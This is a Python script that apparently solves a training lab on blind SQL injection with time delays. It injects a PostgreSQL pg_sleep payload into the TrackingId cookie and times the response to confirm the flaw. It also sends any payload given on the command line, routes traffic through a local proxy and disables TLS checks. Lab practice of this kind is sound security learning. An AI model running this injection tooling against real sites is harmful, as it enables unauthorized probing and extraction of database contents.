# Blind SQL injection with time delays

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def send_payload(s, url, tracking_cookie, payload):
	cookies = {"TrackingId": tracking_cookie + payload}
	r = s.get(url, cookies=cookies)
	time.sleep(.3)
	print('[+] Using payload:\t%s' % payload)
	return r

def cause_delay(s, url, tracking_cookie):
	delay_payload = "' || (SELECT pg_sleep(10))--"
	delay = send_payload(s, url, tracking_cookie, delay_payload)
	print('[+] Server takes %s seconds to respond !' % int(delay.elapsed.total_seconds()))
	if int(delay.elapsed.total_seconds()) >= 10:
		return delay
	else:
		return False

def show_usage():
	print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com "\' UNION SELECT NULL, NULL"' % sys.argv[0])
	print('[+] Example: %s https://www.target.com SOLUTION\t\t(solve the lab)' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Blind SQL injection with time delays')
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		show_usage()
	parsed_url = urllib.parse.urlparse(url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down (or proxy missconfigured) <!>')
			sys.exit(-1)
		tracking_cookie = s.cookies.get_dict().get('TrackingId')
		if payload != "SOLUTION":
			r = send_payload(s, url, tracking_cookie, payload)
			if r.status_code != 500:
				print("[-] Server didn't Respond with an ERROR <!>")
				exit(-1)
			else:
				num = r.text.find('Welcome back!')
				res = r.text[num:].split('\n')[0]
				print(r)
				print(res)
		else:
			print("\n[+] Trying to cause a 10 second delay...")
			delay = cause_delay(s, url, tracking_cookie)
			if delay:
				print(delay)
			else:
				print("[-] Server didn't Respond with DELAY <!>")
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
